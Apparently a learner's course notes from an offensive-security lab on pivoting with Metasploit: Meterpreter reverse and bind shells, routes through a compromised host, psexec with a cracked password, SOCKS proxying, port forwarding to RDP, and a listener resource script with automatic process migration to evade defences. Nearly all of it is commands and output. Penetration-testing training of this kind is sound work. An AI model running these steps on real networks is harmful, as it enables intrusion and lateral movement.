<h5>Pivoting with Metasploit</h5>
<p>The ability to pivot from on target to another is vital.  In Port Redirection and Pivoting, we learned several techniques for pivoting.  Instead of perform these manually, we can also use Metasploit to perform them.</p>
<p>As we did previously, we&#39;ll connect to a bind shell on port 4444 of machine ITWK01.  Assume we are currently gathering info on the target, we identify a second network interface.</p>
<pre><code class="language-bash">
┌──(operator@labhost)-[~/OffSec/msf]
└─$ nc $IT 4444
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Users\luiza&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::45fb:788e:6d57:159e%11
   IPv4 Address. . . . . . . . . . . : 192.168.247.223
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.247.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::70ac:1479:11e0:d2a3%14
   IPv4 Address. . . . . . . . . . . : 172.16.132.199
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
</code></pre>
<ul>
<li>The second interface has IP <code>172.16.132.199</code> assigned.</li>
</ul>
<p>We can attempt to identify live hosts on this second iface leveraging methods from active information gathering.  Before doing so let&#39;s start a Meterpreter shell on our compromised host by downloading and executing <code>met.exe</code> as well as starting the multi/handler.</p>
<pre><code>
msf6 exploit(multi/handler) &gt; run

[*] Started HTTPS reverse handler on https://192.168.45.182:443
[*] https://192.168.45.182:443 handling request from 192.168.247.223; (UUID: q6ffomjo) Redirecting stageless connection from /rFTB8XlDRXgroSqjTsA9yAxl-Rd31X4pw0cV3II1NImcjbQA7wGIuTvM4SOR3pRu_9wlTX8LwansO4JRsNRtn1YKKF9PhqUVjbcYB_or57QB7yt1T4bf2b8Au with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
[*] https://192.168.45.182:443 handling request from 192.168.247.223; (UUID: q6ffomjo) Attaching orphaned/stageless session...
[*] Meterpreter session 5 opened (192.168.45.182:443 -&gt; 192.168.247.223:52558) at 2023-11-24 13:33:08 -0800

meterpreter &gt;
</code></pre>
<p>Now that we have a session on the target sys, we can background it.  To add a route to a network reachable through a compromised host we use <code>route add</code> with the network information and session ID the route applies to.  After adding the route we can display routes with <code>route print</code>.</p>
<pre><code>
meterpreter &gt; bg
[*] Backgrounding session 5...
msf6 exploit(multi/handler) &gt; route add 172.16.132.0/24 5
[*] Route added
msf6 exploit(multi/handler) &gt; route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.132.0       255.255.255.0      Session 5

[*] There are currently no IPv6 routes defined.
</code></pre>
<ul>
<li>With a path to the internal subnet we can enumerate.</li>
</ul>
<p>We could scan the the whole network for live hosts with a port scan aux mod.  This would take some time to complete so we will shorted this step by scanning the only live host in the second network.  Instead of setting the value of <code>RHOSTS</code> to <code>172.16.132.0/24</code> as we would when scanning the whole network, we will set it to <code>172.16.132.200</code>.  For now we will only scan ports 445 and 3389.</p>
<pre><code>
msf6 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 172.16.132.200
RHOSTS =&gt; 172.16.132.200
msf6 auxiliary(scanner/portscan/tcp) &gt; set PORTS 445,3389
PORTS =&gt; 445,3389
msf6 auxiliary(scanner/portscan/tcp) &gt; run

[+] 172.16.132.200:       - 172.16.132.200:445 - TCP OPEN
[+] 172.16.132.200:       - 172.16.132.200:3389 - TCP OPEN
[*] 172.16.132.200:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>
<ul>
<li>Shows that 172.16.132.200 has ports 445 and 3389 open.</li>
<li>Let&#39;s use two mods for SMB and RDP using out pivot host ITWK01 to perform operations on the target.</li>
</ul>
<p>First we use psexec mod to get access to the second target as <code>luiza</code>.  Previously we retrieved NTLM hash via Kiwi, assume we cracked it and retrieved the clear text password <code>BoccieDearAeroMeow1!</code>.  For psexec to succeed <code>luiza</code> must be local admin on the second machine.  For the example, assume we confirmed that through information gathering.</p>
<p>Let&#39;s us <code>exploit/windows/smb/psexec</code> and set <code>SMBUser</code> to <code>luiza</code>, <code>SMBPass</code> to <code>BoccieDearAeroMeow1!</code>, and <code>RHOSTS</code> to <code>172.16.132.200</code>.</p>
<p>Note that the added route will only work with established connections, so the new shell on the target must be a bind shell such as <code>windows/x64/meterpreter/bind_tcp</code> allowing us to use the set route to connect to it.  A reverse shell payload would not be able to route back to our attacking sys because the target does not have a route defined for our network.</p>
<pre><code>
msf6 auxiliary(scanner/portscan/tcp) &gt; use exploit/windows/smb/psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) &gt; show options

   ----                 ---------------  --------  -----------
   RHOSTS                                yes       The target host(s), see https://docs
                                                   .metasploit.com/docs/using-metasploi
                                                   t/basics/using-metasploit.html
   RPORT                445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                   no        Service description to be used on ta
                                                   rget for pretty listing

   E
   SERVICE_NAME                          no        The service name

                                                   tication

                                                   al read/write folder share
   SMBUser                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------

msf6 exploit(windows/smb/psexec) &gt; set RHOSTS 172.16.132.200
RHOSTS =&gt; 172.16.132.200
msf6 exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/bind_tcp
payload =&gt; windows/x64/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) &gt; set LPORT 8000
LPORT =&gt; 8000

LHOST =&gt; 192.168.45.182
</code></pre>
<p>With our options set we can launch the module.</p>
<pre><code>
msf6 exploit(windows/smb/psexec) &gt; run

[*] 172.16.132.200:445 - Connecting to the server...
[*] 172.16.132.200:445 - Authenticating to 172.16.132.200:445 as user &#39;luiza&#39;...

[*] Started bind TCP handler against 172.16.132.200:8000
[*] Sending stage (200774 bytes) to 172.16.132.200
[*] Meterpreter session 6 opened (172.16.132.199:52880 -&gt; 172.16.132.200:8000 via session 5) at 2023-11-24 14:56:33 -0800

meterpreter &gt;
</code></pre>
<ul>
<li>Psexec exploit succeeded in obtaining a Meterpreter shell on the second target via the compromised machine.</li>
</ul>
<p>An alternative to adding routes manually is to use the post mod <code>autoroute</code> to setup a pivot through an existing Meterpreter session automatically.  To demonstrate, we first need to remove the route we set manually.  Let&#39;s terminate the session created through the psexec module and remove all routes with <code>route flush</code>.</p>
<p>Now the only session is the Meterpreter session created with <code>met.exe</code> as user <code>luiza</code>.  The result of <code>route print</code> states that no routes are defined.  Next we activate mod <code>multi/manage/autoroute</code> in which we have to set the session ID as value for the option <code>SESSION</code>, then <code>run</code> to launch the module.</p>
<pre><code>
msf6 exploit(windows/smb/psexec) &gt; use multi/manage/autoroute
msf6 post(multi/manage/autoroute) &gt; show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------

                                       toadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as &quot;/24
                                       &quot;
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) &gt; sessions -l

===============

                                                            68.247.223:52558 (192.168.2
                                                            47.223)

</ul>
<p>We can now use the psexec module as we did before, we can also combine routes with the <code>server/socks_proxy</code> aux mod to configure a SOCKS proxy.  This allows applications outside of MSF to tunnel through the pivot on port 1080 by default.  Set the option <code>SRVHOST</code> to <code>127.0.0.1</code> and <code>VERSION</code> to <code>5</code> for SOCKS5.</p>
<pre><code>
msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) &gt; show options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on
                                       . This must be an address on the local machine o
                                       r 0.0.0.0 to listen on all addresses.
   SRVPORT  1080             yes       The port to listen on
   VERSION  5                yes       The SOCKS version to use (Accepted: 4a, 5)


   When VERSION is 5:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   USERNAME                   no        Proxy username for SOCKS5 listener


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server



View the full module info with the info, or info -d command.

msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 127.0.0.1
SRVHOST =&gt; 127.0.0.1
msf6 auxiliary(server/socks_proxy) &gt; set VERSION 5
VERSION =&gt; 5
msf6 auxiliary(server/socks_proxy) &gt; run -j
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) &gt; 
[*] Starting the SOCKS proxy server
</code></pre>
<ul>
<li>We can now update our proxychains conf to utilize the SOCKS5 proxy.</li>
</ul>
<p>We can now use <code>proxychains</code> to run <code>xfreerdp</code> to obtain GUI access from our Kali sys to target on internal network.</p>
<pre><code>
### --- Increase socket timout of proxychains ---

┌──(operator@labhost)-[~/OffSec/msf]
└─$ less /etc/proxychains.conf

### Some timeouts in milliseconds
tcp_read_time_out 30000
tcp_connect_time_out 30000

### --- Proxy to internal RDP ---

┌──(operator@labhost)-[~/OffSec/msf]
└─$ sudo proxychains xfreerdp /v:172.16.128.200 /u:luiza
</code></pre>
<ul>
<li>Increase socket timeout if proxy conn fails.</li>
<li>We have successfully pivoted through compromised host.</li>
</ul>
<p>We can use a similar technique for port forwarding with the <code>portfwd</code> command within the Meterpreter session, which forwards a port to the internal network.</p>
<pre><code>
msf6 auxiliary(server/socks_proxy) &gt; sessions  -i 42
[*] Starting interaction with 42...

meterpreter &gt; portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the &quot;list&quot; command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
</code></pre>
<p>We create a local port forward from 4389 localhost to 3389 of the target host.</p>
<pre><code>
meterpreter &gt; portfwd add -l 4389 -p 3389 -r 172.16.128.200
[*] Forward TCP relay created: (local) :4389 -&gt; (remote) 172.16.128.200:3389
</code></pre>
<p>We can test by connecting to <code>127.0.0.1:4389</code> with <code>xfreerdp</code>.</p>
<pre><code class="language-bash">
┌──(operator@labhost)-[~/OffSec/msf]
└─$ xfreerdp /v:127.0.0.1:4389 /u:luiza /timeout:20000
</code></pre>
<h4>20.4 Automating Metasploit</h4>
<ul>
<li>Create resource scripts.</li>
<li>Use <a href="https://docs.rapid7.com/metasploit/resource-scripts/">resource scripts</a> in Metasploit.</li>
</ul>
<h5>Resource Scripts</h5>
<p>MSF resource scripts chain together a series of console comands and Ruby code.  We can use either built-in commands of Metasploit or write Ruby code to manage control flow and develop advanced logic components.</p>
<p>In a pentest we may need to setup several multi/handler listeners each time we want to receive an incoming reverse shell.  We could let Metasploit run in the background the whole time or start Metasploit and manually start a listener each time.  We could also create a resource script to automate this.</p>
<p>Let&#39;s create a script that starts a multi/handler listener for a non-staged Win x64 Meterpreter payload.  To do this we create a file in home dir of Kali named <code>listener.rc</code> and open it a text editor.</p>
<p>We first need to determine the command sequence we want to use.  In this example, the first command activates the multi/handler module.  Next we set the payload, <code>windows/meterpreter_reverse_https</code>, the we set our <code>LHOST</code> and <code>LPORT</code> options.</p>
<pre><code>
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
</code></pre>
<p>Additionally we can configure the <code>AutoRunScript</code> option to automatically exec a mod after a session is created.  In this example we will use <code>post/windows/manage/migrate</code> module.  This will cause the spawned Meterpreter to automatically launch a background <code>notepad.exe</code> process to migrate to.  Automating process migration helps to avoid situations where our payload is killed prematurely by defensive technology or termination of the process.</p>
<pre><code>
set AutoRunScript post/windows/manage/migrate
</code></pre>
<p>We also set <code>ExitOnSession</code> to <code>false</code> to ensure that the listener keeps accepting new connections after a session is created.</p>
<pre><code>
set ExitOnSession false
</code></pre>
<p><em>We can also configure advanced options such as ExitOnSession in multi/handler and AutoRunScript in payloads by using show advanced within the activated module or selected payload.</em></p>
<p>Finally we add <code>run</code> with args <code>-z -j</code> to run it as a job in the bg and stop us from automatically interacting with the session.</p>
<pre><code>
run -z -j
</code></pre>
<p>Save the script and start Metasploit by passing the resource script as arg for <code>-r</code>.</p>
<pre><code class="language-bash">
sudo msfconsole -r listener.rc
</code></pre>
<p>Or import it into a running session.</p>
<pre><code>
msf6 &gt; resource listener.rc 
[*] Processing /home/operator/OffSec/msf/listener.rc for ERB directives.
resource (/home/operator/OffSec/msf/listener.rc)&gt; use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter_reverse_https
resource (/home/operator/OffSec/msf/listener.rc)&gt; set PAYLOAD windows/meterpreter_reverse_https
PAYLOAD =&gt; windows/meterpreter_reverse_https
resource (/home/operator/OffSec/msf/listener.rc)&gt; set LHOST 192.168.45.207
LHOST =&gt; 192.168.45.207
resource (/home/operator/OffSec/msf/listener.rc)&gt; set LPORT 443
LPORT =&gt; 443
resource (/home/operator/OffSec/msf/listener.rc)&gt; set AutoRunScript post/windows/manage/migrate
AutoRunScript =&gt; post/windows/manage/migrate
resource (/home/operator/OffSec/msf/listener.rc)&gt; set ExitOnSession false
ExitOnSession =&gt; false
resource (/home/operator/OffSec/msf/listener.rc)&gt; run -z -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.45.207:443
</code></pre>
<ul>
<li>All of our commands were executed from the script.</li>
</ul>
<p>let&#39;s connect to BRUTE2 via RDP with user <code>justin</code> and password <code>SuperS3cure1337#</code>, start PowerShell, download our mal Win bin <code>met.exe</code> that we used previously.</p>
<pre><code>
[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Redirecting stageless connection from /FNYmHRbQWmG7KLoq3kt59QhAdFPJvMnkV2S9mtqTtNlFmz-DxmF6tOosWU1xpKfaFFO2HoI6fTmcJJ8YS with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Attaching orphaned/stageless session...
[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
[*] Session ID 44 (192.168.45.207:443 -&gt; 192.168.205.202:60820) processing AutoRunScript &#39;post/windows/manage/migrate&#39;
[*] Running module against BRUTE2
[*] Current server process: mtr.exe (3660)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 5752
[+] Successfully migrated into process 5752
[*] Meterpreter session 44 opened (192.168.45.207:443 -&gt; 192.168.205.202:60820) at 2023-11-26 14:13:55 -0800
</code></pre>
<ul>
<li>Metasploit automatically migrated the session to the newly spawned process.</li>
</ul>
<p>Instead of creating our own resource scripts we can use the scripts provided by Metasploit found in <code>/usr/share/metasploit-framework/scripts/resource</code>.</p>
<pre><code class="language-bash">
┌──(operator@labhost)-[~/OffSec/msf]
└─$ ls -l /usr/share/metasploit-framework/scripts/resource
total 156
-rw-r--r-- 1 root root  7270 Aug 24 03:07 auto_brute.rc
-rw-r--r-- 1 root root  2203 Aug 24 03:07 autocrawler.rc
-rw-r--r-- 1 root root 11225 Aug 24 03:07 auto_cred_checker.rc
-rw-r--r-- 1 root root  6565 Aug 24 03:07 autoexploit.rc
-rw-r--r-- 1 root root  3422 Aug 24 03:07 auto_pass_the_hash.rc
-rw-r--r-- 1 root root   876 Aug 24 03:07 auto_win32_multihandler.rc
-rw-r--r-- 1 root root   155 Aug 24 03:07 bap_all.rc
-rw-r--r-- 1 root root   762 Aug 24 03:07 bap_dryrun_only.rc
-rw-r--r-- 1 root root   365 Aug 24 03:07 bap_firefox_only.rc
-rw-r--r-- 1 root root   358 Aug 24 03:07 bap_flash_only.rc
-rw-r--r-- 1 root root   354 Aug 24 03:07 bap_ie_only.rc
-rw-r--r-- 1 root root 20767 Aug 24 03:07 basic_discovery.rc
-rw-r--r-- 1 root root  4518 Aug 24 03:07 dev_checks.rc
-rw-r--r-- 1 root root  3358 Aug 24 03:07 fileformat_generator.rc
-rw-r--r-- 1 root root  1085 Aug 24 03:07 meterpreter_compatibility.rc
-rw-r--r-- 1 root root  1064 Aug 24 03:07 mssql_brute.rc
-rw-r--r-- 1 root root  4346 Aug 24 03:07 multi_post.rc
-rw-r--r-- 1 root root  1222 Aug 24 03:07 nessus_vulns_cleaner.rc
-rw-r--r-- 1 root root  1659 Aug 24 03:07 oracle_login.rc
-rw-r--r-- 1 root root   840 Aug 24 03:07 oracle_sids.rc
-rw-r--r-- 1 root root   490 Aug 24 03:07 oracle_tns.rc
-rw-r--r-- 1 root root   833 Aug 24 03:07 port_cleaner.rc
-rw-r--r-- 1 root root  2419 Aug 24 03:07 portscan.rc
-rw-r--r-- 1 root root  1251 Aug 24 03:07 run_all_post.rc
-rw-r--r-- 1 root root   333 Aug 24 03:07 run_cve-2022-22960_lpe.rc
-rw-r--r-- 1 root root  3084 Aug 24 03:07 smb_checks.rc
-rw-r--r-- 1 root root  3837 Aug 24 03:07 smb_validate.rc
-rw-r--r-- 1 root root  2592 Aug 24 03:07 wmap_autotest.rc
</code></pre>
<ul>
<li>There are resource scripts provided for.</li>
<li>Port scanning.</li>
<li>Brute forcing.</li>
<li>Protocol enumerations.</li>
<li>And many more.</li>
<li>Before using them.</li>
<li>Examine.</li>
<li>Understand.</li>
<li>Modify to fit our needs.</li>
</ul>
<p>Some scripts use the global datastore of Metasploit to set options like <code>RHOSTS</code>.  When we use <code>set</code> or <code>unset</code> we define options in the context of a running module.  We can also define values for options across all mods by setting <em>global</em> options, with <code>setg</code> and <code>unsetg</code>.</p>
<p>Resource scripts can automate parts of pentests.  We can create a set of resource scripts for repetative tasks and operations.  We can prepare those scripts and then modify them for each pentest.  Example, we can prepare resource scripts for listeners, pivoting, post-exploitation, etc.  Using them for multiple tests can save a lot of time.</p>
